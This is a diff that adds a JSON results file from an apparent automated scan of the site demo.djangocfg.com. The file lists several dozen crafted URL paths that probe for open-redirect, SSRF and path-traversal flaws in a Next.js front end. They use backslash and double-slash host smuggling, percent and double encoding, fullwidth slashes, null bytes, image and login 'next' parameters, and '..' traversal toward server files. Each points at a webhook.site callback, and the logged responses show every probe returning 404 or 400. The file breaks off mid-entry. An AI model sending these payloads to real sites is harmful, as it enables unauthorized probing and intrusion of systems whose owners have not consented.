@@ -1,0 +1,873 @@
+{
+  "target": "https://demo.djangocfg.com",
+  "tag": "dowkmb3a",
+  "prove": "https://en8q-xxxxxx.webhook.site/unique-id",
+  "results": {
+    "backslash_double_localhost": {
+      "path": "/%5C%5Clocalhost:3000?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5Clocalhost:3000?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Clocalhost:3000?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%5C%5Clocalhost:3000/?ultra=dowkmb3a",
+            "snippet": "/%5C%5Clocalhost:3000/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Clocalhost:3000/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "localhost"
+      ]
+    },
+    "backslash_127": {
+      "path": "/%5Chttp://127.0.0.1:3000?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5Chttp://127.0.0.1:3000?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5Chttp://127.0.0.1:3000?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "127.0.0.1"
+      ]
+    },
+    "double_slash_localhost": {
+      "path": "//http://localhost:3000?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "//http://localhost:3000?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com//http://localhost:3000?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/http:/localhost:3000/?ultra=dowkmb3a",
+            "snippet": "/http:/localhost:3000/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/http:/localhost:3000/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "localhost"
+      ]
+    },
+    "double_slash_127": {
+      "path": "//127.0.0.1:3000?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "//127.0.0.1:3000?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com//127.0.0.1:3000?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "127.0.0.1"
+      ]
+    },
+    "proto_backslash_prove": {
+      "path": "/%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "proto_backslash_double_prove": {
+      "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "proto_double_slash_prove": {
+      "path": "//https://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "//https://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com//https://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/https:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/https:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/https:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "proto_pct_encoded": {
+      "path": "/%5Chttp%3A%2F%2Fen8q-xxxxxx.webhook.site?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5Chttp%3A%2F%2Fen8q-xxxxxx.webhook.site?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5Chttp%3A%2F%2Fen8q-xxxxxx.webhook.site?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "proto_double_pct": {
+      "path": "/%5C%5Chttp%3A%2F%2Fen8q-xxxxxx.webhook.site?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5Chttp%3A%2F%2Fen8q-xxxxxx.webhook.site?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Chttp%3A%2F%2Fen8q-xxxxxx.webhook.site?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "double_encoded_prove": {
+      "path": "/%255Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%255Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%255Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%255Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/%255Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%255Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "pct_backslash": {
+      "path": "/%5C?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%5C/?ultra=dowkmb3a",
+            "snippet": "/%5C/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%5C/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "pct_pct_backslash": {
+      "path": "/%255C?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%255C?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%255C?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%255C/?ultra=dowkmb3a",
+            "snippet": "/%255C/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%255C/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "pct_encoded_protocol_h": {
+      "path": "/h%74tp://example.com?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/h%74tp://example.com?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/h%74tp://example.com?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "pct_encoded_https_prove": {
+      "path": "/h%74tps://en8q-xxxxxx.webhook.site?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/h%74tps://en8q-xxxxxx.webhook.site?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/h%74tps://en8q-xxxxxx.webhook.site?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "unicode_fullwidth_slash": {
+      "path": "/%EF%BC%8Fhttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%EF%BC%8Fhttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%EF%BC%8Fhttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%EF%BC%8Fhttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/%EF%BC%8Fhttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%EF%BC%8Fhttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "null_byte_after_path": {
+      "path": "/%5C%5Clocalhost:3000%00?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C%5Clocalhost:3000%00?ultra=dowkmb3a",
+          "final_status": 400
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C%5Clocalhost:3000%00?ultra=dowkmb3a",
+            "status": 400,
+            "location": null,
+            "snippet": "<html>\r\n<head><title>400 Bad Request</title></head>\r\n<body>\r\n<center><h1>400 Bad Request</h1></center>\r\n<hr><center>cloudflare</center>\r\n</body>\r\n</html>\r\n"
+          }
+        ]
+      },
+      "indicators": [
+        "localhost"
+      ]
+    },
+    "image_raw": {
+      "path": "/_next/image?url=%5C%5Chttps%3A//en8q-xxxxxx.webhook.site/unique-id&w=64&q=75&ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/_next/image?url=%5C%5Chttps%3A//en8q-xxxxxx.webhook.site/unique-id&w=64&q=75&ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/_next/image?url=%5C%5Chttps%3A//en8q-xxxxxx.webhook.site/unique-id&w=64&q=75&ultra=dowkmb3a",
+            "status": 308,
+            "location": "/_next/image/?url=%5C%5Chttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&w=64&q=75&ultra=dowkmb3a",
+            "snippet": "/_next/image/?url=%5C%5Chttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&w=64&q=75&ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/_next/image/?url=%5C%5Chttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&w=64&q=75&ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "image_double": {
+      "path": "/_next/image?url=//https%3A//en8q-xxxxxx.webhook.site/unique-id&w=64&q=75&ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/_next/image?url=//https%3A//en8q-xxxxxx.webhook.site/unique-id&w=64&q=75&ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/_next/image?url=//https%3A//en8q-xxxxxx.webhook.site/unique-id&w=64&q=75&ultra=dowkmb3a",
+            "status": 308,
+            "location": "/_next/image/?url=%2F%2Fhttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&w=64&q=75&ultra=dowkmb3a",
+            "snippet": "/_next/image/?url=%2F%2Fhttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&w=64&q=75&ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/_next/image/?url=%2F%2Fhttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&w=64&q=75&ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "rsc_probe": {
+      "path": "/%5Cen8q-xxxxxx.webhook.site?_rsc=1&ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5Cen8q-xxxxxx.webhook.site?_rsc=1&ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5Cen8q-xxxxxx.webhook.site?_rsc=1&ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "action_probe": {
+      "path": "/%5Cen8q-xxxxxx.webhook.site?__NEXT_ACTION__=1&ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5Cen8q-xxxxxx.webhook.site?__NEXT_ACTION__=1&ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5Cen8q-xxxxxx.webhook.site?__NEXT_ACTION__=1&ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "next_data_traversal": {
+      "path": "/_next/data/dev/app/%2E%2E/%2E%2E/server/app/page.js?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/_next/data/dev/app/%2E%2E/%2E%2E/server/app/page.js?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/_next/data/dev/app/%2E%2E/%2E%2E/server/app/page.js?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "next_static_traversal": {
+      "path": "/_next/static/%2E%2E/%2E%2E/server/app/layout.js?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/_next/static/%2E%2E/%2E%2E/server/app/layout.js?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/_next/static/%2E%2E/%2E%2E/server/app/layout.js?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "login_next_param": {
+      "path": "/login?next=%5C%5Chttps%3A//en8q-xxxxxx.webhook.site/unique-id&ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/login?next=%5C%5Chttps%3A//en8q-xxxxxx.webhook.site/unique-id&ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/login?next=%5C%5Chttps%3A//en8q-xxxxxx.webhook.site/unique-id&ultra=dowkmb3a",
+            "status": 308,
+            "location": "/login/?next=%5C%5Chttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&ultra=dowkmb3a",
+            "snippet": "/login/?next=%5C%5Chttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/login/?next=%5C%5Chttps%3A%2F%2Fen8q-xxxxxx.webhook.site%2Funique-id&ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": []
+    },
+    "wellknown_backslash": {
+      "path": "/.well-known/%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/.well-known/%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/.well-known/%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "og_image_probe": {
+      "path": "/%5Chttps://en8q-xxxxxx.webhook.site/unique-id/opengraph-image.png?tag=dowkmb3a&ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5Chttps://en8q-xxxxxx.webhook.site/unique-id/opengraph-image.png?tag=dowkmb3a&ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5Chttps://en8q-xxxxxx.webhook.site/unique-id/opengraph-image.png?tag=dowkmb3a&ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "og_hop_probe": {
+      "path": "/og/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?tag=dowkmb3a&ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/og/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?tag=dowkmb3a&ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/og/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?tag=dowkmb3a&ultra=dowkmb3a",
+            "status": 308,
+            "location": "/og/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?tag=dowkmb3a&ultra=dowkmb3a",
+            "snippet": "/og/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?tag=dowkmb3a&ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/og/%5C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?tag=dowkmb3a&ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "rare_double_chain": {
+      "path": "/%5C/%5C/https://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%5C/%5C/https://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%5C/%5C/https://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%5C/%5C/https:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/%5C/%5C/https:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%5C/%5C/https:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "mixed_double_encoded": {
+      "path": "/%255C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
+          "path": "/%255C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+          "final_status": 404
+        },
+        "chain": [
+          {
+            "url": "https://demo.djangocfg.com/%255C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+            "status": 308,
+            "location": "/%255C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "snippet": "/%255C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a"
+          },
+          {
+            "url": "https://demo.djangocfg.com/%255C%5Chttps:/en8q-xxxxxx.webhook.site/unique-id/?ultra=dowkmb3a",
+            "status": 404,
+            "location": null,
+            "snippet": "<!DOCTYPE html><html lang=\"en\" class=\"dark\"><head><meta charSet=\"utf-8\" data-next-head=\"\"/><meta name=\"viewport\" content=\"width=device-width\" data-next-head=\"\"/><title data-next-head=\"\">Django CFG</title><meta name=\"description\" content=\"Django CFG Admin Panel\" data-next-head=\"\"/><link rel=\"icon\" ty"
+          }
+        ]
+      },
+      "indicators": [
+        "PROVE_URL"
+      ]
+    },
+    "host_smuggle_1": {
+      "path": "/%5C%5Chttps://en8q-xxxxxx.webhook.site/unique-id?ultra=dowkmb3a",
+      "res": {
+        "initial": {
